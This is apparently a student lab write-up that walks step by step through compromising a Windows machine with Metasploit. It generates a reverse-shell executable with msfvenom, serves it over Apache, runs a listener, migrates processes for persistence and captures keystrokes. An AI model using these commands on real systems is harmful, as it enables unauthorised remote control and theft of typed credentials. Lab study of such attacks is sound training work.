# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:
![image](https://github.com/user-attachments/assets/15eadcef-39ec-435a-bf00-3e32c0b82124)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT

![image](https://github.com/user-attachments/assets/70912c37-f423-42e6-94c4-5178efc14beb)


copy the fun.exe into the apache /var/www/html folder




Start apache server
sudo systemctl apache2 start




Check the status of apache2



Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
![Screenshot 2025-04-07 120027](https://github.com/user-attachments/assets/01b6dfba-8c9e-4e75-8429-ba1226df9d96)


set PAYLOAD windows/meterpreter/reverse_tcp
![image](https://github.com/user-attachments/assets/03316ebe-09b9-4f4b-bf70-3919c351e798)

set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![Screenshot 2025-04-07 115431](https://github.com/user-attachments/assets/85abbe80-3f8f-4ce7-aa1c-70a5e2e3387f)


keyscan_dump	Shows the keystrokes captured so far







## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
